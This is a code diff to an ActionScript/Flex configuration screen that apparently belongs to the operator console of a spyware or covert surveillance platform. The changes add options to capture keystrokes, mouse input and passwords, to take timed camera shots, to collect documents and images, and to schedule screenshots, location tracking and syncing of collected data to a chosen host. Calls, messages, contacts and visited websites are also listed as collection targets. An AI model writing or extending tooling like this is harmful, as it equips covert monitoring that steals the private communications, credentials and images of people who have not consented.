@@ -25,28 +25,35 @@
         messages.selected   = hasAction('messages') || hasAction('chat');
         url.selected        = hasAction('url');
         file.selected       = hasAction('file');
-        screenshot.selected = hasAction('mouse');
-        position.selected   = hasPosition();
+        keylog.selected     = hasAction('keylog');
+        screenshot.selected = hasLoop('SCREENSHOT');
+        camera.selected     = hasLoop('CAMERA');
+        position.selected   = hasLoop('POSITION');
         
         if (screenshot.selected)
           screenshot.seconds.text = String(getDelayFor('SCREENSHOT'));
+        
+        if (camera.selected) {
+          camera.seconds.text = String(getDelayFor('CAMERA'));
+          camera.times.text = String(getIterFor('CAMERA'));
+        }
         
         if (position.selected)
           position.minutes.text = String(getDelayFor('POSITION') / 60);
         
         var entryPoints:ListCollectionView = CollectorManager.instance.getEntryPointsView();
         sync.host.dataProvider = entryPoints;
-        sync.selected = hasSync();
+        sync.selected = hasLoop('SYNC');
         if (sync.selected) {
           sync.minutes.text = String(getDelayFor('SYNC') / 60);
           setEntryPoint(entryPoints);
         }
       }
       
-      private function hasPosition():Boolean
+      private function hasLoop(loop:String):Boolean
       {
         for each (var a:Object in config.actions)
-          if (a.desc == 'POSITION')
+          if (a.desc == loop)
             return true;
         return false;
       }
@@ -77,14 +84,14 @@
         return event == null ? 0 : event.delay as int;
       }
       
-      private function hasSync():Boolean
+      private function getIterFor(desc:String):int
       {
-        var syncAction:Object;
-        for each (var a:Object in config.actions)
-          if (a.desc == 'SYNC')
-            syncAction = a;
+        var event:Object;
+        for each (var e:Object in config.events)
+        if (e.desc == desc)
+          event = e;
         
-        return syncAction != null;
+        return event == null ? 0 : event.iter as int;
       }
       
       private function setEntryPoint(ep:ListCollectionView):void
@@ -108,14 +115,6 @@
         sync.host.selectedItem = host;
       }
       
-      private function goToAdvanced(event:MouseEvent):void
-      {
-        (parent as ConfigurationView).currentState = 'advanced';
-        config.globals.advanced = true;
-        (parent as ConfigurationView).advanced.config = config;
-        (parent as ConfigurationView).advanced.displayConfig();
-      }
-      
       public function getConfig():Object
       {
         var model:Object = {};
@@ -124,12 +123,22 @@
         model.messages   = messages.selected;
         model.url        = url.selected;
         model.file       = file.selected;
+        model.keylog     = keylog.selected;
         model.screenshot = screenshot.selected;
+        model.camera     = camera.selected;
         model.position   = position.selected;
         model.sync       = sync.selected;
 
+        model.documents  = file.documents.selected;
+        model.images     = file.images.selected;
+        
         model.screenshotDelay = Number(screenshot.seconds.text);
+        
+        model.cameraDelay = Number(camera.seconds.text);
+        model.cameraIter = Number(camera.times.text);
+        
         model.positionDelay = Number(position.minutes.text) * 60;
+        
         model.syncDelay = Number(sync.minutes.text) * 60;
         model.syncHost = sync.host.selectedItem.address;
         
@@ -139,30 +148,31 @@
     ]]>
   </fx:Script>
   
-  <s:VGroup width="100%" maxWidth="1200" gap="20" paddingTop="20">
+  <s:VGroup width="100%" maxWidth="1200" gap="15" paddingTop="10">
   
-    <s:HGroup width="100%" gap="30">
+    <s:HGroup width="100%" gap="20">
       <selectors:SimpleSelector id="call" title="Calls (Phone, Skype, MSN)"/>
       <selectors:SimpleSelector id="calendar" title="Contacts &amp; Calendar"/>
     </s:HGroup>
     
-    <s:HGroup width="100%" gap="30">
+    <s:HGroup width="100%" gap="20">
       <selectors:SimpleSelector id="messages" title="Messages (Mail, SMS, Chat)"/>
       <selectors:SimpleSelector id="url" title="Visited Websites"/>
     </s:HGroup>
     
-    <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="file" title="Documents"/>
-      <selectors:ScreenshotSelector id="screenshot" title="Screenshots &amp; Mouse"/>
+    <s:HGroup width="100%" gap="20">
+      <selectors:FileSelector id="file" title="Accessed Files"/>
+      <selectors:SimpleSelector id="keylog" title="Keylog, Mouse &amp; Passwords"/>
     </s:HGroup>
     
-    <s:HGroup width="100%" gap="30">
+    <s:HGroup width="100%" gap="20">
+      <selectors:ScreenshotSelector id="screenshot" title="Screenshots"/>
+      <selectors:CameraSelector id="camera" title="Camera"/>
+    </s:HGroup>
+    
+    <s:HGroup width="100%" gap="20">
       <selectors:PositionSelector id="position" title="Position"/>
       <selectors:SyncSelector id="sync" title="Online Synchronization"/>
-    </s:HGroup>
-    
-    <s:HGroup width="100%" gap="0" horizontalAlign="right">
-      <s:Button label="Go to advanced..." click="goToAdvanced(event)"/>
     </s:HGroup>
     
   </s:VGroup>
